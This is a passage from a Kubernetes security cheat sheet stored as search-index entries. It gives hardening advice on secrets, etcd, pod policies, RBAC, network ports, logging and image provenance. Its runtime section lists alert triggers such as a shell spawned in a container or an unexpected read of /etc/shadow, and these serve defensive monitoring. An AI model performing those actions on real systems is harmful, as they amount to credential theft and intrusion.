object that contains sensitive data, like a password or token. It is necessary to access how sensitive data such as credentials and keys are stored and accessed. Even though a pod is not able to access the secrets of another pod, it is crucial to keep the secret separate from an image or pod. Otherwise, anyone with access to the image would have access to the secret as well. Complex applications that handle multiple processes and have public access are especially vulnerable in this regard. You must ensure that secrets are not being passed as environment variables but are instead mounted into read-only volumes in your containers, for example. Encrypt secrets at rest \u00b6 The etcd database in general contains any information accessible via the Kubernetes API and may grant an attacker significant visibility into the state of your cluster. Always encrypt your backups using a well reviewed backup and encryption solution, and consider using full disk encryption where possible. Kubernetes supports encryption at rest, a feature introduced in 1.7, and beta since 1.13. This will encrypt Secret resources in etcd, preventing parties that gain access to your etcd backups from viewing the content of those secrets. While this feature is currently beta, it offers an additional level of defense when backups are not encrypted or an attacker gains read access to etcd. Kubernetes Security Best Practices: Runtime Phase \u00b6 The runtime phase exposes containerized applications to a slew of new security challenges. Your goal here is to both gain visibility into your running environment and detect and respond to threats as they arise. Proactively securing your containers and Kubernetes deployments at the build and deploy phases can greatly reduce the likelihood of security incidents at runtime and the subsequent effort needed to respond to them. First, you must monitor the most security-relevant container activities, including: Process activity Network communications among containerized services Network communications between containerized services and external clients and servers Observing container behavior to detect anomalies is generally easier in containers than in virtual machines because of the declarative nature of containers and Kubernetes. These attributes allow easier introspection into what you have deployed and its expected activity. Use Pod Security Policies to prevent risky containers/Pods from being used \u00b6 PodSecurityPolicy is a cluster-level resources available in Kubernetes (via kubectl) that is highly recommended. You must enable the PodSecurityPolicy admission controller to use it. Given the nature of admission controllers, you must authorize at least one policy - otherwise no pods will be allowed to be created in the cluster. Pod Security Policies address several critical security use cases, including: Preventing containers from running with privileged flag - this type of container will have most of the capabilities available to the underlying host. This flag also overwrites any rules you set using CAP DROP or CAP ADD. Preventing sharing of host PID/IPC namespace, networking, and ports - this step ensures proper isolation between Docker containers and the underlying host Limiting use of volume types - writable hostPath directory volumes, for example, allow containers to write to the filesystem in a manner that allows them to traverse the host filesystem outside the pathPrefix, so readOnly: true must be used Putting limits on host filesystem use Enforcing read only for root file system via the ReadOnlyRootFilesystem Preventing privilege escalation to root privileges Rejecting containers with root privileges Restricting Linux capabilities to bare minimum in adherence with least privilege principles For more information on Pod security policies, refer to the documentation at https://kubernetes.io/docs/concepts/policy/pod-security-policy/ . Container Runtime Security \u00b6 Hardening containers at runtime gives security teams the ability to detect and respond to threats and anomalies while the containers or workloads are in a running state. This is typically carried out by intercepting the low-level system calls and looking for events that may indicate compromise. Some examples of events that should trigger an alert would include: A shell is run inside a container A container mounts a sensitive path from the host such as /proc A sensitive file is unexpectedly read in a running container such as /etc/shadow An outbound network connection is established Open source tools such as Falco from Sysdig are available to help operators get up an running with container runtime security by providing a large number of out-of-the-box detections as well as the flexibility to create custom rules. Container Sandboxing \u00b6 Container runtimes typically are permitted to make direct calls to the host kernel then the kernel interacts with hardware and devices to respond to the request. Cgroups and namespaces exist to give containers a certain amount of isolation but the still kernel presents a large attack surface area. Often times in multi-tenant and highly untrusted clusters an additional layer of sandboxing is required to ensure container breakout and kernel exploits are not present. Below we will explore a few OSS technologies that help further isolate running containers from the host kernel: Kata Containers: Kata Containers is OSS project that uses stripped-down VMs to keep the resource footprint minimal and maximize performance to ultimately isolate containers further. gVisor : gVisor is a more lightweight than a VM (even stripped down). gVisor is its own independent kernel written in Go to sit in the middle of a container and the host kernel. Strong sandbox. gVisor supports ~70% of the linux system calls from the container but ONLY users about 20 system calls to the host kernel. Firecracker: Firecracker super lightweight VM that runs in user space. Locked down by seccomp, cgroup and namespace policies so system calls are very limited. Firecracker is built with security in mind but may not support all Kubernetes or container runtime deployments. Preventing containers from loading unwanted kernel modules \u00b6 The Linux kernel automatically loads kernel modules from disk if needed in certain circumstances, such as when a piece of hardware is attached or a filesystem is mounted. Of particular relevance to Kubernetes, even unprivileged processes can cause certain network-protocol-related kernel modules to be loaded, just by creating a socket of the appropriate type. This may allow an attacker to exploit a security hole in a kernel module that the administrator assumed was not in use. To prevent specific modules from being automatically loaded, you can uninstall them from the node, or add rules to block them. On most Linux distributions, you can do that by creating a file such as /etc/modprobe.d/kubernetes-blacklist.conf with contents like: # DCCP is unlikely to be needed, has had multiple serious # vulnerabilities, and is not well-maintained. blacklist dccp # SCTP is not used in most Kubernetes clusters, and has also had # vulnerabilities in the past. blacklist sctp To block module loading more generically, you can use a Linux Security Module (such as SELinux) to completely deny the module_request permission to containers, preventing the kernel from loading modules for containers under any circumstances. (Pods would still be able to use modules that had been loaded manually, or modules that were loaded by the kernel on behalf of some more-privileged process. Compare and analyze different runtime activity in pods of the same deployments \u00b6 Containerized applications are replicated for high availability, fault tolerance, or scale reasons. Replicas should behave nearly identically; replicas with significant deviations from the others warrant further investigation. Integrate your Kubernetes security tool with other external systems (email, PagerDuty, Slack, Google Cloud Security Command Center, SIEMs [security information and event management], etc.) and leverage deployment labels or annotations to alert the team responsible for a given application when a potential threat is detected. Commercial Kubernetes security vendors should support a wide array of integrations with external tools Monitor network traffic to limit unnecessary or insecure communication \u00b6 Observe your active network traffic and compare that traffic to what is allowed based on your Kubernetes network policies. Containerized applications typically make extensive use of cluster networking, and observing active networking traffic is a good way to understand how applications interact with each other and identify unexpected communication. At the same time, comparing the active traffic with what\u2019s allowed gives you valuable information about what isn\u2019t happening but is allowed. With that information, you can further tighten your allowed network policies so that it removes superfluous connections and decreases your attack surface. Open source projects like https://github.com/kinvolk/inspektor-gadget may help with this, and commercial security solutions provide varying degrees of container network traffic analysis. If breached, scale suspicious pods to zero \u00b6 Use Kubernetes native controls to contain a successful breach by automatically instructing Kubernetes to scale suspicious pods to zero or kill then restart instances of breached applications. Rotate infrastructure credentials frequently \u00b6 The shorter the lifetime of a secret or credential the harder it is for an attacker to make use of that credential. Set short lifetimes on certificates and automate their rotation. Use an authentication provider that can control how long issued tokens are available and use short lifetimes where possible. If you use service account tokens in external integrations, plan to rotate those tokens frequently. For example, once the bootstrap phase is complete, a bootstrap token used for setting up nodes should be revoked or its authorization removed. Receiving alerts for security updates and reporting vulnerabilities \u00b6 Join the kubernetes-announce group (< https://kubernetes.io/docs/reference/issues-security/security/ ) for emails about security announcements. See the security reporting page ( https://kubernetes.io/docs/reference/issues-security/security ) for more on how to report vulnerabilities. Logging \u00b6 Kubernetes supplies cluster-based logging, allowing to log container activity into a central log hub. When a cluster is created, the standard output and standard error output of each container can be ingested using a Fluentd agent running on each node into either Google Stackdriver Logging or into Elasticsearch and viewed with Kibana. Enable audit logging \u00b6 The audit logger is a beta feature that records actions taken by the API for later analysis in the event of a compromise. It is recommended to enable audit logging and archive the audit file on a secure server Ensure logs are monitoring for anomalous or unwanted API calls, especially any authorization failures (these log entries will have a status message \u201cForbidden\u201d). Authorization failures could mean that an attacker is trying to abuse stolen credentials. Managed Kubernetes providers, including GKE, provide access to this data in their cloud console and may allow you to set up alerts on authorization failures. Audit logs \u00b6 Audit logs can be useful for compliance as they should help you answer the questions of what happened, who did what and when. Kubernetes provides flexible auditing of kube-apiserver requests based on policies. These help you track all activities in chronological order. Here is an example of an audit log: { \"kind\" : \"Event\" , \"apiVersion\" : \"audit.k8s.io/v1beta1\" , \"metadata\" : { \"creationTimestamp\" : \"2019-08-22T12:00:00Z\" } , \"level\" : \"Metadata\" , \"timestamp\" : \"2019-08-22T12:00:00Z\" , \"auditID\" : \"23bc44ds-2452-242g-fsf2-4242fe3ggfes\" , \"stage\" : \"RequestReceived\" , \"requestURI\" : \"/api/v1/namespaces/default/persistentvolumeclaims\" , \"verb\" : \"list\" , \"user\" : { \"username\" : \"user@example.org\" , \"groups\" : [ \"system:authenticated\" ] } , \"sourceIPs\" : [ \"172.12.56.1\" ] , \"objectRef\" : { \"resource\" : \"persistentvolumeclaims\" , \"namespace\" : \"default\" , \"apiVersion\" : \"v1\" } , \"requestReceivedTimestamp\" : \"2019-08-22T12:00:00Z\" , \"stageTimestamp\" : \"2019-08-22T12:00:00Z\" } Define Audit Policies \u00b6 Audit policy defines rules about what events should be recorded and what data they should include. The audit policy object structure is defined in the audit.k8s.io API group. When an event is processed, it's compared against the list of rules in order. The first matching rule sets the \"audit level\" of the event. The known audit levels are as follows: None - don't log events that match this rule. Metadata - log request metadata (requesting user, timestamp, resource, verb, etc.) but not request or response body. Request - log event metadata and request body but not response body. This does not apply for non-resource requests. RequestResponse - log event metadata, request and response bodies. This does not apply for non-resource requests. You can pass a file with the policy to kube-apiserver using the --audit-policy-file flag. If the flag is omitted, no events are logged. Note that the rules field must be provided in the audit policy file. A policy with no (0) rules is treated as illegal. Understanding Logging \u00b6 One main challenge with logging Kubernetes is understanding what logs are generated and how to use them. Let\u2019s start by examining the Kubernetes logging architecture from a birds eye view. Container logging \u00b6 The first layer of logs that can be collected from a Kubernetes cluster are those being generated by your containerized applications. The easiest method for logging containers is to write to the standard output (stdout) and standard error (stderr) streams. Manifest is as follows. ```YAML apiVersion: v1 kind: Pod metadata: name: example spec: containers: - name: example image: busybox args: [/bin/sh, -c, 'while true; do echo $(date); sleep 1; done'] ``` To apply the manifest, run: ```bash kubectl apply -f example.yaml ``` To take a look the logs for this container, run: ```bash kubectl log <container-name> command. ``` For persisting container logs, the common approach is to write logs to a log file and then use a sidecar container. As shown below in the pod configuration above, a sidecar container will run in the same pod along with the application container, mounting the same volume and processing the logs separately. Pod Manifest is as follows: YAML apiVersion: v1 kind: Pod metadata: name: example spec: containers: - name: example image: busybox args: - /bin/sh - -c - > while true; do echo \"$(date)\\n\" >> /var/log/example.log; sleep 1; done volumeMounts: - name: varlog mountPath: /var/log - name: sidecar image: busybox args: [/bin/sh, -c, 'tail -f /var/log/example.log'] volumeMounts: - name: varlog mountPath: /var/log volumes: - name: varlog emptyDir: {} Node logging \u00b6 When a container running on Kubernetes writes its logs to stdout or stderr streams, the container engine streams them to the logging driver configured in Kubernetes. In most cases, these logs will end up in the /var/log/containers directory on your host. Docker supports multiple logging drivers but unfortunately, driver configuration is not supported via the Kubernetes API. Once a container is terminated or restarted, kubelet stores logs on the node. To prevent these files from consuming all of the host\u2019s storage, the Kubernetes node implements a log rotation mechanism. When a container is evicted from the node, all containers with corresponding log files are evicted. Depending on what operating system and additional services you\u2019re running on your host machine, you might need to take a look at additional logs. For example, systemd logs can be retrieved using the following command: bash journalctl -u Cluster logging \u00b6 On the level of the Kubernetes cluster itself, there is a long list of cluster components that can be logged as well as additional data types that can be used (events, audit logs). Together, these different types of data can give you visibility into how Kubernetes is performing as a ystem. Some of these components run in a container, and some of them run on the operating system level (in most cases, a systemd service). The systemd services write to journald, and components running in containers write logs to the /var/log directory, unless the container engine has been configured to stream logs differently. Events \u00b6 Kubernetes events can indicate any Kubernetes resource state changes and errors, such as exceeded resource quota or pending pods, as well as any informational messages. Kubernetes events can indicate any Kubernetes resource state changes and errors, such as exceeded resource quota or pending pods, as well as any informational messages. The following command returns all events within a specific namespace: ```bash kubectl get events -n NAMESPACE LAST SEEN TYPE REASON OBJECT MESSAGE kube-system 8m22s Normal Scheduled pod/metrics-server-66dbbb67db-lh865 Successfully assigned kube-system/metrics-server-66dbbb67db-lh865 to aks-agentpool-42213468-1 kube-system 8m14s Normal Pulling pod/metrics-server-66dbbb67db-lh865 Pulling image \"aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1\" kube-system 7m58s Normal Pulled pod/metrics-server-66dbbb67db-lh865 Successfully pulled image \"aksrepos.azurecr.io/mirror/metrics-server-amd64:v0.2.1\" kube-system 7m57s Normal Created pod/metrics-server-66dbbb67db-lh865 Created container metrics-server kube-system 7m57s Normal Started pod/metrics-server-66dbbb67db-lh865 Started container metrics-server kube-system 8m23s Normal SuccessfulCreate replicaset/metrics-server-66dbbb67db Created pod: metrics-server-66dbbb67db-lh865 ``` The following command will show the latest events for this specific Kubernetes resource: kubectl describe pod <pod-name> Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 14m default-scheduler Successfully assigned kube-system/coredns-7b54b5b97c-dpll7 to aks-agentpool-42213468-1 Normal Pulled 13m kubelet, aks-agentpool-42213468-1 Container image \"aksrepos.azurecr.io/mirror/coredns:1.3.1\" already present on machine Normal Created 13m kubelet, aks-agentpool-42213468-1 Created container coredns Normal Started 13m kubelet, aks-agentpool-42213468-1 Started container coredns Final thoughts \u00b6 Embed security earlier into the container lifecycle \u00b6 You must integrate security earlier into the container lifecycle and ensure alignment and shared goals between security and DevOps teams. Security can (and should) be an enabler that allows your developers and DevOps teams to confidently build and deploy applications that are production-ready for scale, stability and security. Use Kubernetes-native security controls to reduce operational risk \u00b6 Leverage the native controls built into Kubernetes whenever available in order to enforce security policies so that your security controls don\u2019t collide with the orchestrator. Instead of using a third-party proxy or shim to enforce network segmentation, as an example, use Kubernetes network policies to ensure secure network communication. Leverage the context that Kubernetes provides to prioritize remediation efforts \u00b6 In sprawling Kubernetes environments, manually triaging security incidents and policy violations is time consuming. For example, a deployment containing a vulnerability with severity score of 7 or greater should be moved up in remediation priority if that deployment contains privileged containers and is open to the Internet but moved down if it\u2019s in a test environment and supporting a non-critical app. References \u00b6 Master documentation - https://kubernetes.io Kubernetes Security Best Practices everyone must follow - https://www.cncf.io/blog/2019/01/14/9-kubernetes-security-best-practices-everyone-must-follow Securing a Cluster - https://kubernetes.io/blog/2016/08/security-best-practices-kubernetes-deployment Security Best Practices for Kubernetes Deployment - https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster Kubernetes Security Best Practices - https://phoenixnap.com/kb/kubernetes-security-best-practices Kubernetes Security 101: Risks and 29 Best Practices - https://www.stackrox.com/post/2020/05/kubernetes-security-101 15 Kubernetes security best practice to secure your cluster - https://www.mobilise.cloud/15-kubernetes-security-best-practice-to-secure-your-cluster The Ultimate Guide to Kubernetes Security - https://neuvector.com/container-security/kubernetes-security-guide A hacker's guide to Kubernetes security - https://techbeacon.com/enterprise-it/hackers-guide-kubernetes-security 11 Ways (Not) to Get Hacked - https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked 12 Kubernetes configuration best practices - https://www.stackrox.com/post/2019/09/12-kubernetes-configuration-best-practices/#6-securely-configure-the-kubernetes-api-server A Practical Guide to Kubernetes Logging - https://logz.io/blog/a-practical-guide-to-kubernetes-logging Kubernetes Web UI (Dashboard) - https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard Tesla cloud resources are hacked to run cryptocurrency-mining malware - https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware OPEN POLICY AGENT: CLOUD-NATIVE AUTHORIZATION - https://blog.styra.com/blog/open-policy-agent-authorization-for-the-cloud Introducing Policy As Code: The Open Policy Agent (OPA) - https://www.magalix.com/blog/introducing-policy-as-code-the-open-policy-agent-opa What service mesh provides - https://aspenmesh.io/what-service-mesh-provides Three Technical Benefits of Service Meshes and their Operational Limitations, Part 1 - https://glasnostic.com/blog/service-mesh-istio-limits-and-benefits-part-1","title":"Kubernetes Security"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#kubernetes-security-cheat-sheet","text":"","title":"Kubernetes Security Cheat Sheet"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#kubernetes","text":"Kubernetes is an open source container orchestration engine for automating deployment, scaling, and management of containerized applications. The open source project is hosted by the Cloud Native Computing Foundation (CNCF). When you deploy Kubernetes, you get a cluster. A Kubernetes cluster consists of a set of worker machines, called nodes that run containerized applications. The control plane manages the worker nodes and the Pods in the cluster.","title":"Kubernetes"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#control-plane-components","text":"The control plane's components make global decisions about the cluster, as well as detecting and responding to cluster events. It consists of components such as kube-apiserver, etcd, kube-scheduler, kube-controller-manager and cloud-controller-manager Component Description kube-apiserver kube-apiserver exposes the Kubernetes API. The API server is the front end for the Kubernetes control plane. etcd etcd is a consistent and highly-available key-value store used as Kubernetes' backing store for all cluster data. kube-scheduler kube-scheduler watches for newly created Pods with no assigned node, and selects a node for them to run on. kube-controller-manager kube-controller-manager runs controller processes. Logically, each controller is a separate process, but to reduce complexity, they are all compiled into a single binary and run in a single process. cloud-controller-manager The cloud controller manager lets you link your cluster into your cloud provider's API, and separates out the components that interact with that cloud platform from components that just interact with your cluster.","title":"Control Plane Components"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#node-components","text":"Node components run on every node, maintaining running pods and providing the Kubernetes runtime environment. It consists of components such as kubelet, kube-proxy and container runtime. Component Description kubelet kubelet is an agent that runs on each node in the cluster. It makes sure that containers are running in a Pod kube-proxy kube-proxy is a network proxy that runs on each node in your cluster, implementing part of the Kubernetes Service concept Container runtime The container runtime is the software that is responsible for running containers. This cheatsheet provides a starting point for securing Kubernetes cluster. It is divided into the following categories: Securing Kubernetes hosts Securing Kubernetes components Kubernetes Security Best Practices: Build Phase Kubernetes Security Best Practices: Deploy Phase Kubernetes Security Best Practices: Runtime Phase","title":"Node Components"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#securing-kubernetes-hosts","text":"There are several options available to deploy Kubernetes: on bare metal, on-premise, and in the public cloud (custom Kubernetes build on virtual machines OR use a managed service). Kubernetes was designed to be highly portable and customers can easily switch between these installations, migrating their workloads. All of this potential customisation of Kubernetes means it can be designed to fit a large variety of scenarios; however, this is also its greatest weakness when it comes to security. Kubernetes is designed out of the box to be customizable and users must turn on certain functionality to secure their cluster. This means that the engineers responsible for deploying the Kubernetes platform need to know about all the potential attack vectors and vulnerabilities poor configuration can lead to. It is recommended to harden the underlying hosts by installing the latest version of operating system, hardening the operating system, implement necessary patch management and configuration management system, implementing essential firewall rules and undertake specific security measures depending on the datacenter environment.","title":"Securing Kubernetes hosts"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#kubernetes-version","text":"It has become impossible to track all potential attack vectors. This fact is unfortunate as there is nothing more vital than to be aware and on top of potential threats. The best defense is to make sure that you are running the latest available version of Kubernetes. The Kubernetes project maintains release branches for the most recent three minor releases and it backports the applicable fixes, including security fixes, to those three release branches, depending on severity and feasibility. Patch releases are cut from those branches at a regular cadence, plus additional urgent releases, when required. Hence it is always recommended to upgrade the Kubernetes cluster to the latest available stable version. It is recommended to refer to the version skew policy for further details https://kubernetes.io/docs/setup/release/version-skew-policy/ . There are several techniques such as rolling updates, and node pool migrations that allow you to complete an update with minimal disruption and downtime.","title":"Kubernetes Version"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#securing-kubernetes-components","text":"","title":"Securing Kubernetes components"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#control-network-access-to-sensitive-ports","text":"Kubernetes clusters usually listen on a range of well-defined and distinctive ports which makes it easier identify the clusters and attack them. Hence it is highly recommended to configure authentication and authorization on the cluster and cluster nodes. Here is an overview of the default ports used in Kubernetes. Make sure that your network blocks access to ports and consider limiting access to the Kubernetes API server except from trusted networks. Master node(s): Protocol Port Range Purpose TCP 6443- Kubernetes API Server TCP 2379-2380 etcd server client API TCP 10250 Kubelet API TCP 10251 kube-scheduler TCP 10252 kube-controller-manager TCP 10255 Read-Only Kubelet API Worker nodes: Protocol Port Range Purpose TCP 10250 Kubelet API TCP 10255 Read-Only Kubelet API TCP 30000-32767 NodePort Services","title":"Control network access to sensitive ports"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#limit-direct-access-to-kubernetes-nodes","text":"You should limit SSH access to Kubernetes nodes, reducing the risk for unauthorized access to host resource. Instead you should ask users to use \"kubectl exec\", which will provide direct access to the container environment without the ability to access the host. You can use Kubernetes Authorization Plugins to further control user access to resources. This allows defining fine-grained-access control rules for specific namespace, containers and operations.","title":"Limit Direct Access to Kubernetes Nodes"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#controlling-access-to-the-kubernetes-api","text":"The Kubernetes platform is controlled using API requests and as such is the first line of defense against attackers. Controlling who has access and what actions they are allowed to perform is the primary concern. For more information, refer to the documentation at https://kubernetes.io/docs/reference/access-authn-authz/controlling-access/ .","title":"Controlling access to the Kubernetes API"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#use-transport-layer-security","text":"Communication in the cluster between services should be handled using TLS, encrypting all traffic by default. This, however, is often overlooked with the thought being that the cluster is secure and there is no need to provide encryption in transit within the cluster. Advances in network technology, such as the service mesh, have led to the creation of products like LinkerD and Istio which can enable TLS by default while providing extra telemetry information on transactions between services. Kubernetes expects that all API communication in the cluster is encrypted by default with TLS, and the majority of installation methods will allow the necessary certificates to be created and distributed to the cluster components. Note that some components and installation methods may enable local ports over HTTP and administrators should familiarize themselves with the settings of each component to identify potentially unsecured traffic. To learn more on usage of TLS in Kubernetes cluster, refer to the documentation at https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/#1-tls-everywhere .","title":"Use Transport Layer Security"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#api-authentication","text":"Choose an authentication mechanism for the API servers to use that matches the common access patterns when you install a cluster. For instance, small single user clusters may wish to use a simple certificate or static Bearer token approach. Larger clusters may wish to integrate an existing OIDC or LDAP server that allow users to be subdivided into groups. All API clients must be authenticated, even those that are part of the infrastructure like nodes, proxies, the scheduler, and volume plugins. These clients are typically service accounts or use x509 client certificates, and they are created automatically at cluster startup or are setup as part of the cluster installation. For more information, consult Kubernetes authentication reference document at https://kubernetes.io/docs/reference/access-authn-authz/authentication","title":"API Authentication"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#api-authorization-implement-role-based-access-control","text":"In Kubernetes, you must be authenticated (logged in) before your request can be authorized (granted permission to access). Kubernetes expects attributes that are common to REST API requests. This means that Kubernetes authorization works with existing organization-wide or cloud-provider-wide access control systems which may handle other APIs besides the Kubernetes API. Kubernetes authorizes API requests using the API server. It evaluates all of the request attributes against all policies and allows or denies the request. All parts of an API request must be allowed by some policy in order to proceed. This means that permissions are denied by default. Role-based access control (RBAC) is a method of regulating access to computer or network resources based on the roles of individual users within your organization. Kubernetes ships an integrated Role-Based Access Control (RBAC) component that matches an incoming user or group to a set of permissions bundled into roles. These permissions combine verbs (get, create, delete) with resources (pods, services, nodes) and can be namespace or cluster scoped. A set of out of the box roles are provided that offer reasonable default separation of responsibility depending on what actions a client might want to perform. It is recommended that you use the Node and RBAC authorizers together, in combination with the NodeRestriction admission plugin. RBAC authorization uses the rbac.authorization.k8s.io API group to drive authorization decisions, allowing you to dynamically configure policies through the Kubernetes API. To enable RBAC, start the API server with the --authorization-mode flag set to a comma-separated list that includes RBAC; for example: # kube-apiserver --authorization-mode=Example,RBAC --other-options --more-options For detailed examples of utilizing RBAC, refer to Kubernetes documentation at https://kubernetes.io/docs/reference/access-authn-authz/rbac","title":"API Authorization - Implement role-based access control"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#restrict-access-to-etcd","text":"etcd is a critical Kubernetes component which stores information on state and secrets, and it should be protected differently from the rest of your cluster. Write access to the API server's etcd is equivalent to gaining root on the entire cluster, and even read access can be used to escalate privileges fairly easily. The Kubernetes scheduler will search etcd for pod definitions that do not have a node. It then sends the pods it finds to an available kubelet for scheduling. Validation for submitted pods is performed by the API server before it writes them to etcd, so malicious users writing directly to etcd can bypass many security mechanisms - e.g. PodSecurityPolicies. Administrators should always use strong credentials from the API servers to their etcd server, such as mutual auth via TLS client certificates, and it is often recommended to isolate the etcd servers behind a firewall that only the API servers may access.","title":"Restrict access to etcd"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#caution","text":"Allowing other components within the cluster to access the master etcd instance with read or write access to the full keyspace is equivalent to granting cluster-admin access. Using separate etcd instances for non-master components or using etcd ACLs to restrict read and write access to a subset of the keyspace is strongly recommended.","title":"Caution"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#controlling-access-to-the-kubelet","text":"Kubelets expose HTTPS endpoints which grant powerful control over the node and containers. By default Kubelets allow unauthenticated access to this API. Production clusters should enable Kubelet authentication and authorization. For more information, refer to Kubelet authentication/authorization documentation at https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-authentication-authorization","title":"Controlling access to the Kubelet"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#securing-kubernetes-dashboard","text":"The Kubernetes dashboard is a webapp for monitoring your cluster. It it is not a part of the Kubernetes cluster itself, it has to be installed by the owners of the cluster. Thus, there are a lot of tutorials on how to do this. Unfortunately, most of them create a service account with very high privileges. This caused Tesla and some others to be hacked via such a poorly configured K8s dashboard. (Reference: Tesla cloud resources are hacked to run cryptocurrency-mining malware - https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware/ ) To prevent attacks via the dashboard, you should follow some tips: Do not expose the dashboard to the public. There is no need to access such a powerful tool from outside your LAN Turn on RBAC, so you can limit the service account the dashboard uses Do not grant the service account of the dashboard high privileges Grant permissions per user, so each user only can see what he is supposed to see If you are using network policies, you can block requests to the dashboard even from internal pods (this will not affect the proxy tunnel via kubectl proxy) Before version 1.8, the dashboard had a service account with full privileges, so check that there is no role binding for cluster-admin left.","title":"Securing Kubernetes Dashboard"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#kubernetes-security-best-practices-build-phase","text":"Securing containers and Kubernetes starts in the build phase with securing your container images. The two main things to do here are to build secure images and to scan those images for any known vulnerabilities. A Container image is an immutable, lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings [ https://www.docker.com/resources/what-container ]. The image shares the kernel of the operating system present in its host machine. Container images must be built using approved and secure base image that is scanned and monitored at regular intervals to ensure only secure and authentic images can be used within the cluster. It is recommended to configure strong governance policies regarding how images are built and stored in trusted image registries.","title":"Kubernetes Security Best Practices: Build Phase"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#ensure-that-only-authorized-images-are-used-in-your-environment","text":"Without a process that ensures that only images adhering to the organization\u2019s policy are allowed to run, the organization is open to risk of running vulnerable or even malicious containers. Downloading and running images from unknown sources is dangerous. It is equivalent to running software from an unknown vendor on a production server. Don\u2019t do that.","title":"Ensure That Only Authorized Images are used in Your Environment"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#container-registry-and-the-use-of-an-image-scanner-to-identify-known-vulnerabilities","text":"Container registry is the central repository of container images. Based on the needs, we can utilize public repositories or have a private repository as the container registry. Use private registries to store your approved images - make sure you only push approved images to these registries. This alone reduces the number of potential images that enter your pipeline to a fraction of the hundreds of thousands of publicly available images. Build a CI pipeline that integrates security assessment (like vulnerability scanning), making it part of the build process. The CI pipeline should ensure that only vetted code (approved for production) is used for building the images. Once an image is built, it should be scanned for security vulnerabilities, and only if no issues are found then the image would be pushed to a private registry, from which deployment to production is done. A failure in the security assessment should create a failure in the pipeline, preventing images with bad security quality from being pushed to the image registry. There is work in progress being done in Kubernetes for image authorization plugins, which will allow preventing the shipping of unauthorized images. For more information, refer to the PR https://github.com/kubernetes/kubernetes/pull/27129 .","title":"Container registry and the use of an image scanner to identify known vulnerabilities"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#use-minimal-base-images-and-avoid-adding-unnecessary-components","text":"Avoid using images with OS package managers or shells because they could contain unknown vulnerabilities. If you must include OS packages, remove the package manager at a later step. Consider using minimal images such as distroless images, as an example.","title":"Use minimal base images and avoid adding unnecessary components"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#distroless-images","text":"Restricting what's in your runtime container to precisely what's necessary for your app is a best practice employed by Google and other tech giants that have used containers in production for many years. It improves the signal to noise of scanners (e.g. CVE) and reduces the burden of establishing provenance to just what you need. For more information on ditroless images, refer to https://github.com/GoogleContainerTools/distroless .","title":"Distroless images"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#use-the-latest-imagesensure-images-are-up-to-date","text":"Ensure your images (and any third-party tools you include) are up to date and utilizing the latest versions of their components.","title":"Use the latest images/ensure images are up to date"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#kubernetes-security-best-practices-deploy-phase","text":"Kubernetes infrastructure should be configured securely prior to workloads being deployed. From a security perspective, you first need visibility into what you\u2019re deploying \u2013 and how. Then you can identify and respond to security policy violations. At a minimum, you need to know: What is being deployed - including information about the image being used, such as components or vulnerabilities, and the pods that will be deployed Where it is going to be deployed - which clusters, namespaces, and nodes How it is deployed - whether it runs privileged, what other deployments it can communicate with, the pod security context that is applied, if any What it can access - including secrets, volumes, and other infrastructure components such as the host or orchestrator API Is it compliant - whether it complies with your policies and security requirements","title":"Kubernetes Security Best Practices: Deploy Phase"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#use-kubernetes-namespaces-to-properly-isolate-your-kubernetes-resources","text":"Namespaces give you the ability to create logical partitions and enforce separation of your resources as well as limit the scope of user permissions.","title":"Use Kubernetes namespaces to properly isolate your Kubernetes resources"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#setting-the-namespace-for-a-request","text":"To set the namespace for a current request, use the --namespace flag. Refer to the following examples: kubectl run nginx --image = nginx --namespace = <insert-namespace-name-here> kubectl get pods --namespace = <insert-namespace-name-here>","title":"Setting the namespace for a request"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#setting-the-namespace-preference","text":"You can permanently save the namespace for all subsequent kubectl commands in that context. kubectl config set-context --current --namespace = <insert-namespace-name-here> Validate it with the following command. kubectl config view --minify | grep namespace: Learn more about namespaces at https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces","title":"Setting the namespace preference"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html#create-policies-to-govern-image-provenance-using-the-imagepolicywebhook","text":"Prevent unapproved images from being used with the admission controller ImagePolicyWebhook to reject pods that use unapproved images including: Images that 